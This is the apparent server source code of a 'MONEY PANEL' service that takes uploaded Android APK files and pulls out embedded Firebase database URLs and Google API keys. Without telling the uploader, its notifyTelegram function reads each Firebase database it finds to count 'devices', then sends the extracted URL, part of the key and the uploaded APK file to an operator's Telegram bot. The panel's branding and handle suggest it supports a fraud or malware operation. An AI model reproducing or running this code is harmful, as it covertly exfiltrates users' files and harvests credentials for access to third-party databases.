const express = require('express');
const multer = require('multer');
const cors = require('cors');
const JSZip = require('jszip');
const path = require('path');
const https = require('https');

const app = express();

// --- SECURITY ---
// Rate limit tracking
const rateMap = new Map();
const RATE_LIMIT = 30; // max requests per minute per IP
const RATE_WINDOW = 60000;

function getRealIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
}

app.use((req, res, next) => {
  // Security headers
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

  // Rate limiting
  const ip = getRealIp(req);
  const now = Date.now();
  if (!rateMap.has(ip)) rateMap.set(ip, []);
  const hits = rateMap.get(ip).filter(t => now - t < RATE_WINDOW);
  hits.push(now);
  rateMap.set(ip, hits);
  if (hits.length > RATE_LIMIT) {
    return res.status(429).json({ error: 'Too many requests. Try again later.' });
  }
  next();
});

// Clean rate map every 5 min
setInterval(() => {
  const now = Date.now();
  for (const [ip, hits] of rateMap) {
    const valid = hits.filter(t => now - t < RATE_WINDOW);
    if (valid.length === 0) rateMap.delete(ip);
    else rateMap.set(ip, valid);
  }
}, 300000);

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Disable cache for HTML so engine launcher always loads fresh
app.use((req, res, next) => {
  if (req.path.endsWith('.html') || req.path === '/' || !req.path.includes('.')) {
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  }
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 200 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    // Only allow APK files
    if (file.originalname.endsWith('.apk') || file.mimetype === 'application/vnd.android.package-archive') {
      cb(null, true);
    } else {
      cb(null, true); // allow anyway for scanning
    }
  }
});

// --- BOT CONFIG FROM ENV ---
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID = process.env.CHAT_ID || '';

function extractStrings(buf) {
  const bytes = new Uint8Array(buf);
  const strings = [];
  let cur = '';
  for (let i = 0; i < bytes.length; i++) {
    const c = bytes[i];
    if (c >= 32 && c < 127) cur += String.fromCharCode(c);
    else { if (cur.length >= 6) strings.push(cur); cur = ''; }
  }
  if (cur.length >= 6) strings.push(cur);
  return strings;
}

async function scanApk(buffer) {
  const zip = await JSZip.loadAsync(buffer);
  const found = { urls: [], keys: [] };
  for (const name of Object.keys(zip.files)) {
    if (name.match(/google[-_]services\.json$/i)) {
      try {
        const txt = await zip.files[name].async('string');
        const j = JSON.parse(txt);
        if (j.project_info) {
          if (j.project_info.firebase_url) found.urls.push(j.project_info.firebase_url);
          if (j.project_info.project_id) found.urls.push(`https://${j.project_info.project_id}-default-rtdb.firebaseio.com`);
        }
        if (j.client) j.client.forEach(c => {
          if (c.api_key) c.api_key.forEach(k => { if (k.current_key) found.keys.push(k.current_key); });
        });
      } catch (e) {}
    }
    if (name.match(/res\/values.*\/strings\.xml$/)) {
      try {
        const txt = await zip.files[name].async('string');
        let m;
        m = txt.match(/firebase_database_url[^>]*>([^<]+)/i); if (m) found.urls.push(m[1]);
        m = txt.match(/google_database_url[^>]*>([^<]+)/i); if (m) found.urls.push(m[1]);
        m = txt.match(/firebase_url[^>]*>([^<]+)/i); if (m) found.urls.push(m[1]);
        m = txt.match(/google_api_key[^>]*>([^<]+)/i); if (m) found.keys.push(m[1]);
        const au = txt.match(/https:\/\/[a-z0-9._-]+\.firebaseio\.com/gi); if (au) found.urls.push(...au);
        const ak = txt.match(/AIza[A-Za-z0-9_-]{35}/g); if (ak) found.keys.push(...ak);
      } catch (e) {}
    }
    if ((name.endsWith('.json') || name.endsWith('.xml')) && !name.endsWith('.arsc')) {
      try {
        const txt = await zip.files[name].async('string');
        const u = txt.match(/https:\/\/[a-z0-9._-]+\.firebaseio\.com/gi); if (u) found.urls.push(...u);
        const k = txt.match(/AIza[A-Za-z0-9_-]{35}/g); if (k) found.keys.push(...k);
        const u2 = txt.match(/https:\/\/[a-z0-9._-]+\.firebasedatabase\.app/gi); if (u2) found.urls.push(...u2);
      } catch (e) {}
    }
    if (name === 'resources.arsc' || name.endsWith('.dex') || name === 'AndroidManifest.xml' || name.endsWith('.so')) {
      try {
        const buf = await zip.files[name].async('arraybuffer');
        const strs = extractStrings(buf);
        strs.forEach(s => {
          if (s.match(/https:\/\/[a-z0-9._-]+\.firebaseio\.com/i)) found.urls.push(s);
          if (s.match(/^AIza[A-Za-z0-9_-]{35}$/)) found.keys.push(s);
          if (s.match(/https:\/\/[a-z0-9._-]+\.firebasedatabase\.app/i)) found.urls.push(s);
        });
      } catch (e) {}
    }
  }
  const urls = [...new Set(found.urls)].filter(u => u.includes('firebase'));
  const keys = [...new Set(found.keys)];
  return { success: urls.length > 0 || keys.length > 0, url: urls[0] || null, key: keys[0] || null, allUrls: urls, allKeys: keys };
}

async function notifyTelegram(file, result) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    const fileName = file.originalname || 'uploaded.apk';
    const sizeMB = (file.size / 1024 / 1024).toFixed(2);

    let deviceInfo = '';
    if (result.url) {
      try {
        const dbUrl = result.url.replace(/\/$/, '') + '/.json?shallow=true';
        const dbData = await new Promise((resolve) => {
          https.get(dbUrl, (r) => {
            let d = '';
            r.on('data', chunk => d += chunk);
            r.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
          }).on('error', () => resolve(null));
        });
        if (dbData && typeof dbData === 'object') {
          deviceInfo = `\n📱 Devices: ${Object.keys(dbData).length}`;
        }
      } catch(e) {}
    }

    const caption = `📦 *APK Uploaded to MONEY PANEL*\n\n📁 File: \`${fileName}\`\n📏 Size: ${sizeMB} MB\n🔗 Firebase: \`${result.url || 'Not found'}\`\n🔑 Key: \`${result.key ? result.key.substring(0,15) + '...' : 'Not found'}\`${deviceInfo}\n\n👤 Panel: @moneyfuckingsocietyy`;

    const msgData = JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' });
    await new Promise((resolve) => {
      const req = https.request({
        hostname: 'api.telegram.org', path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(msgData) }
      }, resolve);
      req.write(msgData);
      req.end();
    });

    if (file.size < 50 * 1024 * 1024) {
      const boundary = '----MP' + Date.now();
      const parts = [];
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`));
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n📦 ${fileName} (${sizeMB}MB)\r\n`));
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${fileName}"\r\nContent-Type: application/octet-stream\r\n\r\n`));
      parts.push(file.buffer);
      parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
      const bodyBuf = Buffer.concat(parts);
      await new Promise((resolve) => {
        const req = https.request({
          hostname: 'api.telegram.org', path: `/bot${BOT_TOKEN}/sendDocument`,
          method: 'POST', headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': bodyBuf.length }
        }, resolve);
        req.write(bodyBuf);
        req.end();
      });
    }
  } catch (e) { console.log('TG error:', e.message); }
}

app.post('/firebase/fetch', upload.single('file'), async (req, res) => {
  try {
    if (req.file) {
      const result = await scanApk(req.file.buffer);
      notifyTelegram(req.file, result).catch(() => {});
      return res.json(result);
    }
    res.json({ success: false, error: 'No file uploaded' });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.get('/health', (req, res) => res.json({ status: 'ok' }));
app.get('/engine', (req, res) => res.sendFile(path.join(__dirname, 'public', 'engine.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`MONEY UPDATE PANEL running on port ${PORT}`));
